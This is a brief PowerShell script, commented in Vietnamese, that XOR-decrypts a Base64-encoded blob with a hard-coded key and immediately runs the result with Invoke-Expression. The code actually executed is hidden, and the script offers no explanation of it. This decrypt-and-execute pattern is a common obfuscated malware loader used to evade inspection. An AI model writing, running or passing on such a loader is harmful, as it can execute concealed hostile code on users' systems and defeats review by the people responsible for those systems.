# Định nghĩa hàm XOR để giải mã
function XOR-Decryption {
    param (
        [string]$inputString,
        [string]$key
    )

    # Chuyển đổi nội dung đã mã hóa từ Base64 sang mảng byte
    $inputBytes = [System.Convert]::FromBase64String($inputString)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

    $outputBytes = @()
    for ($i = 0; $i -lt $inputBytes.Length; $i++) {
        # XOR từng byte với byte tương ứng từ khóa
        $xorByte = $inputBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
        $outputBytes += [System.Convert]::ToByte($xorByte)
    }

    # Chuyển đổi mảng byte đã XOR thành chuỗi UTF-8
    $outputString = [System.Text.Encoding]::UTF8.GetString($outputBytes)
    return $outputString
}

# Nội dung đã mã hóa dưới dạng Base64
$encryptedText = "VwRDT0VWAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RUW9HAQYGAhUNMAoNBgAaH0VEUywNBAofDkguFgcxFxQBDhYNU0gWAAxUSQ0NBxUQSEpbGQQOXQIKBg0BCRAKFhcAHQsADgsNXQYMH0pAWARIRFdQXRERGBFWHgQKHEoQBBIXHwoCFksEGFRbU0g2AQA2ChYQEDUCABYdBQJzOgsVHQ4RRiABAxcGARYdBAtZVxYAAAwEHyYWHREGHBFaKAoXBwANBm8="

# Khóa XOR
$key = "secretkey"

# Giải mã nội dung bằng XOR
$decryptedContent = XOR-Decryption -inputString $encryptedText -key $key


# Thực thi nội dung giải mã
iex $decryptedContent
